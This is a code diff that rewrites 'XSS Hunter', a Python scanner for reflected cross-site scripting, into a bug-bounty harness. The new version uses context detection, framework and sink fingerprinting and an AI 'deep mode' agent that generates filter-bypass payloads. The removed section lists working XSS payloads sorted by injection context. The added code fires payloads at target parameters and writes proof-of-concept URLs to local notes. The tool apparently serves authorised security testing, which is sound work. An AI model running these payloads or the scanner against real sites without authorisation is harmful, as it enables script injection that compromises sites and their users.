@@ -1,334 +1,432 @@
-#!/usr/bin/env python3
-"""
-XSS Hunter - Reflected XSS Scanner with Context Detection
-"""
+"""Main XSS harness implementation."""
+
+from __future__ import annotations
+
+import asyncio
+from dataclasses import asdict, dataclass
+from datetime import datetime, timezone
+import html
+import json
+from pathlib import Path
+import re
+from typing import Iterable
+from urllib.parse import parse_qs, urlencode, urljoin, urlsplit, urlunsplit
+from uuid import uuid4
 
 import httpx
-import re
-from typing import Optional
-from urllib.parse import urljoin, urlencode
+
+try:
+    from bs4 import BeautifulSoup
+except ImportError:  # pragma: no cover
+    BeautifulSoup = None
+
+try:
+    from .bypass_generator import BypassGenerator
+    from .context_detector import ContextDetector, ContextType, InjectionContext
+    from .deep_mode_agent import Attempt, DeepModeAgent
+    from .framework_fingerprinter import FrameworkFingerprinter, FrameworkInfo
+    from .payload_sets import get_payloads_for_context
+    from .sink_detector import Sink, SinkDetector
+except ImportError:  # pragma: no cover
+    from bypass_generator import BypassGenerator
+    from context_detector import ContextDetector, ContextType, InjectionContext
+    from deep_mode_agent import Attempt, DeepModeAgent
+    from framework_fingerprinter import FrameworkFingerprinter, FrameworkInfo
+    from payload_sets import get_payloads_for_context
+    from sink_detector import Sink, SinkDetector
+
+
+@dataclass
+class ScanResult:
+    url: str
+    param: str
+    payload: str
+    reflected: bool
+    blocked: bool
+    truncated: bool
+    likely_executable: bool
+    status_code: int
+    context: str
+    sink: str = ""
+    filter_type: str = "NO_BLOCK"
+    response_evidence: str = ""
+    reflected_fragment: str = ""
+
+
+@dataclass
+class XSSFinding:
+    type: str
+    url: str
+    param: str
+    payload: str
+    context: str
+    sink: str
+    poc: str
+    severity: str
+    response_evidence: str
 
 
 class XSSHunter:
-    """XSS scanner with context detection and framework fingerprinting."""
+    """Main XSS testing harness."""
 
-    # Payloads organized by context
-    PAYLOADS = {
-        "html_body": [
-            "<script>alert(1)</script>",
-            "<img src=x onerror=alert(1)>",
-            "<svg onload=alert(1)>",
-            "<iframe src=javascript:alert(1)>",
-            "<body onload=alert(1)>",
-            "<marquee onstart=alert(1)>",
-            "<video><source onerror=alert(1)>",
-            "<audio src=x onerror=alert(1)>",
-            "<details open ontoggle=alert(1)>",
-            "<select onfocus=alert(1) autofocus>",
-        ],
-        "html_attribute": [
-            '" onload=alert(1) x="',
-            "' onload=alert(1) x='",
-            '"><script>alert(1)</script>',
-            "'><script>alert(1)</script>",
-            '" autofocus onfocus=alert(1)"',
-            "' autofocus onfocus=alert(1)'",
-            '"><img src=x onerror=alert(1)>',
-            '"><svg onload=alert(1)>',
-        ],
-        "html_attribute_noquotes": [
-            " onload=alert(1)",
-            " onerror=alert(1)",
-            " onfocus=alert(1)",
-            " onclick=alert(1)",
-            " onmouseover=alert(1)",
-        ],
-        "js_string_single": [
-            "';alert(1);//",
-            "';alert(1);var x='",
-            "';(alert(1));var x='",
-            "'+(alert(1))+'",
-            "';confirm(1);//",
-            "';prompt(1);//",
-        ],
-        "js_string_double": [
-            '";alert(1);//',
-            '";alert(1);var x="',
-            '";(alert(1));var x="',
-            '"+(alert(1))+"',
-            '";confirm(1);//',
-            '";prompt(1);//',
-        ],
-        "js_string_template": [
-            "${alert(1)}",
-            "{{alert(1)}}",
-            "<%=alert(1)%>",
-            "${constructor.constructor('alert(1)')()}",
-        ],
-    }
-
-    # Framework fingerprint patterns
-    FRAMEWORK_PATTERNS = {
-        "angular": [
-            r"ng-app",
-            r"ng-controller",
-            r"ng-bind",
-            r"ng-model",
-            r"angular\.js",
-            r"angular\.module",
-            r"\$\.angular",
-        ],
-        "react": [
-            r"data-reactroot",
-            r"data-reactid",
-            r"_reactRootContainer",
-            r"__REACT_DEVTOOLS_GLOBAL_HOOK__",
-            r"react\.js",
-            r"/react[@-]?\d*\.?\d*\.js",
-        ],
-        "vue": [
-            r"__vue__",
-            r"v-if",
-            r"v-for",
-            r"v-bind:",
-            r"v-on:",
-            r"vue\.js",
-            r"/vue[@-]?\d*\.?\d*\.js",
-            r"data-v-[\da-f]+",
-        ],
-        "jquery": [
-            r"jquery",
-            r"\$\.fn\.",
-            r"jQuery\.",
-            r"/jquery[-.]?\d*\.js",
-            r"jquery\.js",
-        ],
-    }
-
-    # Dangerous sink patterns in inline JS
-    SINK_PATTERNS = {
-        "innerHTML": [r"\.innerHTML\s*=", r"\.outerHTML\s*="],
-        "document_write": [r"document\.write\s*\(", r"document\.writeln\s*\("],
-        "eval": [r"\beval\s*\(", r"new\s+Function\s*\("],
-        "setTimeout": [r"setTimeout\s*\(\s*['\"].*?['\"]", r"setInterval\s*\(\s*['\"].*?['\"]"],
-        "location": [r"location\.href\s*=", r"location\.assign\s*\(", r"location\.replace\s*\("],
-        "write": [r"\.write\s*\(", r"\.writeln\s*\("],
-    }
-
-    def __init__(self, timeout: int = 10, user_agent: Optional[str] = None):
-        self.timeout = timeout
-        self.default_ua = user_agent or (
-            "Mozilla/5.0 (XSS-Hunter/1.0; +https://github.com/bug-bounty-harness)"
+    def __init__(self, target_url: str, params: dict | None = None, program: str | None = None):
+        self.target_url = target_url
+        self.params = self._normalize_params(params)
+        self.program = program or "adhoc"
+        self.session = httpx.Client(
+            timeout=30,
+            follow_redirects=True,
+            headers={"User-Agent": "XSSHunter/1.0"},
         )
-        self.client = httpx.Client(timeout=timeout)
+        self.framework: FrameworkInfo | None = None
+        self.context: InjectionContext | None = None
+        self.sinks: list[Sink] = []
+        self.findings: list[XSSFinding] = []
 
-    def close(self):
-        self.client.close()
+        self.context_detector = ContextDetector()
+        self.framework_fingerprinter = FrameworkFingerprinter()
+        self.sink_detector = SinkDetector()
+        self.bypass_generator = BypassGenerator()
+        self.deep_mode_agent = DeepModeAgent()
 
-    def detect_frameworks(self, response_text: str) -> list[str]:
-        """Fingerprint frameworks from response content."""
-        found = []
-        for framework, patterns in self.FRAMEWORK_PATTERNS.items():
-            for pattern in patterns:
-                if re.search(pattern, response_text, re.IGNORECASE):
-                    found.append(framework)
-                    break
-        return found
+        self._baseline_response: httpx.Response | None = None
+        self._base_params = self._extract_url_params()
+        if self.params:
+            self._base_params.update(self.params)
 
-    def detect_sinks(self, response_text: str) -> list[str]:
-        """Detect dangerous JS sinks in inline scripts."""
-        found = []
-        for sink, patterns in self.SINK_PATTERNS.items():
-            for pattern in patterns:
-                if re.search(pattern, response_text, re.IGNORECASE):
-                    found.append(sink)
-                    break
-        return found
+    def scan(self, mode: str = "standard") -> list[XSSFinding]:
+        """Run the XSS scan."""
+        self.findings = []
+        self._baseline_response = self._make_request(self._base_params)
+        self.framework = self.framework_fingerprinter.fingerprint(self._baseline_response)
+        self.sinks = self._collect_sinks(self._baseline_response)
 
-    def detect_context(self, original: str, reflected: str) -> str:
-        """Detect where the payload was reflected."""
-        # Check if reflected inside a script tag
-        script_match = re.search(r"<script[^>]*>(.*?)</script>", reflected, re.DOTALL | re.IGNORECASE)
-        if script_match and original in script_match.group(1):
-            if "'" in reflected and '"' not in reflected:
-                return "js_string_single"
-            elif '"' in reflected:
-                return "js_string_double"
-            elif "${" in reflected or "{{" in reflected:
-                return "js_string_template"
-            return "js_string"
+        if mode == "deep":
+            findings = self._deep_scan()
+        else:
+            findings = self._standard_scan()
 
-        # Check if inside HTML attribute (has =")
-        if re.search(r'=\s*["\'][^"\']*' + re.escape(original), reflected):
-            if re.search(r'>\s*' + re.escape(original), reflected):
-                return "html_body_and_attribute"
-            return "html_attribute"
+        self._save_outputs(findings, mode)
+        return findings
 
-        # Check if inside tag content
-        if re.search(r">[^<]*" + re.escape(original), reflected):
-            return "html_body"
+    def _standard_scan(self) -> list[XSSFinding]:
+        """Standard scan: probe reflection and apply context payload sets."""
+        findings: list[XSSFinding] = []
+        for param in self._scan_params():
+            baseline = self._make_request(self._base_params)
+            context = self._probe_param(param, baseline)
+            self.context = context
 
-        # Check for no-quotes attribute context
-        if re.search(r"\s" + re.escape(original.split()[0] if ' ' in original else original), reflected):
-            return "html_attribute_noquotes"
+            payloads = get_payloads_for_context(context.type)
+            for payload in payloads:
+                result = self._submit_payload_for_param(param, payload, baseline)
+                if self._is_finding(result):
+                    findings.append(self._build_finding(result))
 
-        return "unknown"
+        self.findings = self._dedupe_findings(findings)
+        return self.findings
 
-    def scan(
+    def _deep_scan(self) -> list[XSSFinding]:
+        """Deep scan: AI-driven contextual analysis."""
+        findings: list[XSSFinding] = []
+        for param in self._scan_params():
+            baseline = self._make_request(self._base_params)
+            context = self._probe_param(param, baseline)
+            self.context = context
+
+            attempts: list[Attempt] = []
+            standard_payloads = get_payloads_for_context(context.type)
+            for payload in standard_payloads:
+                result = self._submit_payload_for_param(param, payload, baseline)
+                attempts.append(self._attempt_from_result(result))
+                if self._is_finding(result):
+                    findings.append(self._build_finding(result))
+
+            bypass_payload = asyncio.run(
+                self.deep_mode_agent.analyze(
+                    target=self.target_url,
+                    framework=self.framework or FrameworkInfo(name="vanilla"),
+                    context=context,
+                    sinks=self.sinks,
+                    attempt_history=attempts,
+                )
+            )
+
+            for payload in bypass_payload.payloads:
+                result = self._submit_payload_for_param(param, payload, baseline)
+                attempts.append(self._attempt_from_result(result))
+                if self._is_finding(result):
+                    findings.append(self._build_finding(result, finding_type="dom" if self._dom_style_sink(result.sink) else "reflected"))
+
+        self.findings = self._dedupe_findings(findings)
+        return self.findings
+
+    def submit_payload(self, payload: str, context: str, param: str | None = None) -> ScanResult:
+        """Submit a single payload and return reflection/blocking metadata."""
+        param_name = param or next(iter(self._scan_params()), "q")
+        baseline = self._baseline_response or self._make_request(self._base_params)
+        return self._submit_payload_for_param(param_name, payload, baseline, context_hint=context)
+
+    def close(self) -> None:
+        self.session.close()
+
+    def _probe_param(self, param: str, baseline: httpx.Response) -> InjectionContext:
+        marker = f"XSSHUNTER_{uuid4().hex[:12]}"
+        probe_response = self._make_request(self._params_with(param, marker))
+        return self.context_detector.detect(baseline, probe_response, marker)
+
+    def _submit_payload_for_param(
         self,
-        url: str,
-        params: Optional[dict] = None,
-        method: str = "GET",
-        data: Optional[dict] = None,
-        headers: Optional[dict] = None,
-    ) -> dict:
-        """
-        Scan a URL for reflected XSS.
+        param: str,
+        payload: str,
+        baseline: httpx.Response,
+        context_hint: str | None = None,
+    ) -> ScanResult:
+        response = self._make_request(self._params_with(param, payload))
+        context = self.context_detector.detect(baseline, response, payload)
+        if context_hint and context.type == ContextType.NO_REFLECTION:
+            context.type = context_hint
 
-        Args:
-            url: Target URL
-            params: Query parameters (for GET)
-            method: HTTP method (GET or POST)
-            data: Form data (for POST)
-            headers: Additional headers
+        reflected_fragment = context.reflected_fragment
+        filter_type = self.bypass_generator.detect_filter_type(payload, reflected_fragment, response.text)
+        truncated = bool(reflected_fragment) and len(reflected_fragment) < len(payload)
+        likely_executable = self._looks_executable(context.type, reflected_fragment or payload)
+        blocked = filter_type != "NO_BLOCK" and not likely_executable
 
-        Returns:
-            Dictionary with scan results
-        """
-        result = {
-            "url": url,
-            "method": method,
-            "vulnerabilities": [],
-            "reflections": [],
-            "frameworks": [],
-            "sinks": [],
-        }
+        return ScanResult(
+            url=str(response.url),
+            param=param,
+            payload=payload,
+            reflected=context.reflected,
+            blocked=blocked,
+            truncated=truncated,
+            likely_executable=likely_executable,
+            status_code=response.status_code,
+            context=context.type,
+            sink=self._select_sink(context.type),
+            filter_type=filter_type,
+            response_evidence=context.surrounding_text or self._response_snippet(response.text, payload),
+            reflected_fragment=reflected_fragment,
+        )
 
-        # Make initial request to get baseline
-        req_headers = headers or {}
-        req_headers["User-Agent"] = self.default_ua
+    def _make_request(self, params: dict[str, str]) -> httpx.Response:
+        response = self.session.get(self._base_url(), params=params)
+        response.raise_for_status()
+        return response
 
-        try:
-            if method.upper() == "POST":
-                resp = self.client.post(url, data=data, headers=req_headers)
+    def _collect_sinks(self, response: httpx.Response) -> list[Sink]:
+        sinks: list[Sink] = []
+        for script in self._extract_inline_scripts(response.text):
+            sinks.extend(self.sink_detector.find_sinks(script))
+        for script_url in self._extract_script_urls(response.text):
+            try:
+                js_response = self.session.get(script_url)
+                js_response.raise_for_status()
+            except Exception:
+                continue
+            sinks.extend(self.sink_detector.find_sinks(js_response.text))
+        return self._dedupe_sinks(sinks)
+
+    def _extract_script_urls(self, html_text: str) -> list[str]:
+        if BeautifulSoup is not None:
+            soup = BeautifulSoup(html_text, "html.parser")
+            urls = []
+            for script in soup.find_all("script", src=True):
+                urls.append(urljoin(self.target_url, script["src"]))
+            return urls[:10]
+        return [
+            urljoin(self.target_url, match.group(1))
+            for match in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html_text, re.IGNORECASE)
+        ][:10]
+
+    def _extract_inline_scripts(self, html_text: str) -> list[str]:
+        if BeautifulSoup is not None:
+            soup = BeautifulSoup(html_text, "html.parser")
+            return [script.get_text() for script in soup.find_all("script") if not script.get("src")]
+        return re.findall(r"<script[^>]*>(.*?)</script>", html_text, re.IGNORECASE | re.DOTALL)
+
+    def _looks_executable(self, context_type: str, fragment: str) -> bool:
+        lowered = html.unescape(fragment).lower()
+        if context_type in {ContextType.HTML_BODY, ContextType.HTML_ATTRIBUTE, ContextType.HTML_COMMENT}:
+            return any(token in lowered for token in ("<script", "onerror", "onload", "onfocus", "javascript:", "<svg", "<img", "<iframe"))
+        if context_type in {ContextType.JS_STRING, ContextType.JS_TEMPLATE}:
+            return any(token in lowered for token in ("alert(", "confirm(", "prompt(", "constructor(", "</script>", "${"))
+        if context_type == ContextType.URL_PARAM:
+            return "javascript:" in lowered or lowered.startswith("data:text/html")
+        if context_type == ContextType.STYLESHEET:
+            return "javascript:" in lowered or "@import" in lowered or "</style>" in lowered
+        return False
+
+    def _select_sink(self, context_type: str) -> str:
+        if self.sinks:
+            return self.sinks[0].name
+        if context_type == ContextType.URL_PARAM:
+            return "URL navigation"
+        if self.framework and self.framework.sinks:
+            return self.framework.sinks[0]
+        return "reflection"
+
+    def _response_snippet(self, response_text: str, value: str, radius: int = 80) -> str:
+        candidates = [value, html.escape(value), html.escape(value, quote=True)]
+        for candidate in candidates:
+            index = response_text.find(candidate)
+            if index >= 0:
+                left = max(0, index - radius)
+                right = min(len(response_text), index + len(candidate) + radius)
+                return response_text[left:right].replace("\n", "\\n")
+        return response_text[: radius * 2].replace("\n", "\\n")
+
+    def _attempt_from_result(self, result: ScanResult) -> Attempt:
+        outcome = "reflected" if result.reflected else "blocked"
+        if result.blocked:
+            outcome = "blocked"
+        elif result.truncated:
+            outcome = "truncated"
+        elif result.likely_executable:
+            outcome = "likely_executable"
+        return Attempt(
+            payload=result.payload,
+            outcome=outcome,
+            filter_type=result.filter_type,
+            response_preview=result.response_evidence,
+            reflected_fragment=result.reflected_fragment,
+        )
+
+    def _is_finding(self, result: ScanResult) -> bool:
+        if not result.reflected:
+            return False
+        if result.blocked:
+            return False
+        if not result.likely_executable:
+            return False
+        return True
+
+    def _build_finding(self, result: ScanResult, finding_type: str = "reflected") -> XSSFinding:
+        severity = self._severity_for(result, finding_type)
+        return XSSFinding(
+            type=finding_type,
+            url=result.url,
+            param=result.param,
+            payload=result.payload,
+            context=result.context,
+            sink=result.sink,
+            poc=self._build_poc(result.param, result.payload),
+            severity=severity,
+            response_evidence=result.response_evidence,
+        )
+
+    def _severity_for(self, result: ScanResult, finding_type: str) -> str:
+        if finding_type == "stored":
+            return "P1"
+        if "eval" in result.sink.lower() or "function" in result.sink.lower() or "dangerouslysetinnerhtml" in result.sink.lower():
+            return "P1"
+        return "P2"
+
+    def _dom_style_sink(self, sink_name: str) -> bool:
+        lowered = sink_name.lower()
+        return any(token in lowered for token in ("innerhtml", "eval", "function", "render", "ng-bind-html", "dangerouslysetinnerhtml"))
+
+    def _build_poc(self, param: str, payload: str) -> str:
+        params = self._params_with(param, payload)
+        query = urlencode(params, doseq=False)
+        split = urlsplit(self.target_url)
+        return urlunsplit((split.scheme, split.netloc, split.path, query, split.fragment))
+
+    def _base_url(self) -> str:
+        split = urlsplit(self.target_url)
+        return urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))
+
+    def _extract_url_params(self) -> dict[str, str]:
+        split = urlsplit(self.target_url)
+        parsed = parse_qs(split.query, keep_blank_values=True)
+        normalized: dict[str, str] = {}
+        for key, values in parsed.items():
+            normalized[key] = values[0] if values else ""
+        return normalized
+
+    def _normalize_params(self, params: dict | None) -> dict[str, str]:
+        if not params:
+            return {}
+        normalized: dict[str, str] = {}
+        for key, value in params.items():
+            if isinstance(value, list):
+                normalized[str(key)] = str(value[0]) if value else ""
             else:
-                resp = self.client.get(url, params=params, headers=req_headers)
-        except httpx.RequestError as e:
-            result["error"] = str(e)
-            return result
+                normalized[str(key)] = str(value)
+        return normalized
 
-        original_text = resp.text
-        result["status_code"] = resp.status_code
+    def _params_with(self, param: str, value: str) -> dict[str, str]:
+        params = dict(self._base_params)
+        params[param] = value
+        return params
 
-        # Framework fingerprinting
-        result["frameworks"] = self.detect_frameworks(original_text)
+    def _scan_params(self) -> Iterable[str]:
+        params = self.params or self._base_params
+        if params:
+            return list(params.keys())
+        return ["q"]
 
-        # Sink detection
-        result["sinks"] = self.detect_sinks(original_text)
+    def _save_outputs(self, findings: list[XSSFinding], mode: str) -> None:
+        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
+        output_dir = Path.home() / "Shared" / "bounty_recon" / self.program / "ghost" / "xss_scan"
+        output_dir.mkdir(parents=True, exist_ok=True)
 
-        # Test each parameter
-        test_params = params or {}
-        param_names = list(test_params.keys()) if test_params else []
+        report_path = output_dir / f"xss_scan_{mode}_{timestamp}.json"
+        report = {
+            "target_url": self.target_url,
+            "program": self.program,
+            "mode": mode,
+            "framework": asdict(self.framework) if self.framework else None,
+            "context": asdict(self.context) if self.context else None,
+            "sinks": [asdict(sink) for sink in self.sinks],
+            "findings": [asdict(finding) for finding in findings],
+        }
+        report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
 
-        # If no params, try common param names
-        if not param_names:
-            param_names = ["q", "search", "id", "name", "query", "s", "test", "xss", "input"]
+        notes_dir = Path.home() / "notes" / self.program / "findings" / "xss"
+        notes_dir.mkdir(parents=True, exist_ok=True)
+        note_path = notes_dir / f"xss_scan_{timestamp}.md"
+        note_lines = [
+            f"# XSS Scan - {self.target_url}",
+            "",
+            f"- Mode: {mode}",
+            f"- Framework: {(self.framework.name if self.framework else 'unknown')}",
+            f"- Findings: {len(findings)}",
+            "",
+        ]
+        for finding in findings[:10]:
+            note_lines.extend(
+                [
+                    f"## {finding.severity} - {finding.param}",
+                    f"- Type: {finding.type}",
+                    f"- Context: {finding.context}",
+                    f"- Sink: {finding.sink}",
+                    f"- Payload: `{finding.payload}`",
+                    f"- PoC: `{finding.poc}`",
+                    f"- Evidence: `{finding.response_evidence[:300]}`",
+                    "",
+                ]
+            )
+        note_path.write_text("\n".join(note_lines), encoding="utf-8")
 
-        for param in param_names:
-            for context, payloads in self.PAYLOADS.items():
-                for payload in payloads:
-                    # Clone params with test value
-                    test_params = dict(params) if params else {}
-                    test_params[param] = payload
+    def _dedupe_findings(self, findings: list[XSSFinding]) -> list[XSSFinding]:
+        deduped: list[XSSFinding] = []
+        seen: set[tuple[str, str, str]] = set()
+        for finding in findings:
+            key = (finding.url, finding.param, finding.payload)
+            if key in seen:
+                continue
+            seen.add(key)
+            deduped.append(finding)
+        return deduped
 
-                    try:
-                        if method.upper() == "POST":
-                            resp = self.client.post(url, data=test_params, headers=req_headers)
-                        else:
-                            resp = self.client.get(url, params=test_params, headers=req_headers)
-
-                        reflected_text = resp.text
-
-                        # Check if our payload is reflected
-                        if payload in reflected_text:
-                            detected_context = self.detect_context(payload, reflected_text)
-                            reflection = {
-                                "parameter": param,
-                                "payload": payload,
-                                "context": detected_context,
-                                "expected_context": context,
-                                "status_code": resp.status_code,
-                            }
-                            result["reflections"].append(reflection)
-
-                            # If context matches or we found a workable reflection, flag it
-                            if detected_context == context or detected_context in [
-                                "html_body",
-                                "html_attribute",
-                                "js_string_single",
-                                "js_string_double",
-                            ]:
-                                vuln = {
-                                    "parameter": param,
-                                    "payload": payload,
-                                    "context": detected_context,
-                                    "confidence": "high" if detected_context == context else "medium",
-                                    "url": str(resp.url),
-                                }
-                                result["vulnerabilities"].append(vuln)
-
-                    except httpx.RequestError:
-                        continue
-
-        return result
-
-
-def main():
-    """CLI entry point."""
-    import argparse
-
-    parser = argparse.ArgumentParser(description="XSS Hunter - Reflected XSS Scanner")
-    parser.add_argument("url", help="Target URL")
-    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
-    parser.add_argument("-d", "--data", help="POST data (key=value&key2=value2)")
-    parser.add_argument("-H", "--header", action="append", help="Extra headers")
-    parser.add_argument("-p", "--param", action="append", help="Parameters to test")
-    args = parser.parse_args()
-
-    hunter = XSSHunter()
-
-    headers = {}
-    if args.header:
-        for h in args.header:
-            if ":" in h:
-                k, v = h.split(":", 1)
-                headers[k.strip()] = v.strip()
-
-    params = {}
-    if args.param:
-        for p in args.param:
-            if "=" in p:
-                k, v = p.split("=", 1)
-                params[k.strip()] = v.strip()
-
-    data = None
-    if args.data:
-        data = dict(kv.split("=") for kv in args.data.split("&"))
-
-    result = hunter.scan(
-        url=args.url,
-        params=params if params else None,
-        method=args.method,
-        data=data,
-        headers=headers if headers else None,
-    )
-
-    hunter.close()
-
-    import json
-
-    print(json.dumps(result, indent=2))
-
-
-if __name__ == "__main__":
-    main()
+    def _dedupe_sinks(self, sinks: list[Sink]) -> list[Sink]:
+        deduped: list[Sink] = []
+        seen: set[tuple[str, int, str]] = set()
+        for sink in sinks:
+            key = (sink.name, sink.line, sink.snippet)
+            if key in seen:
+                continue
+            seen.add(key)
+            deduped.append(sink)
+        return deduped
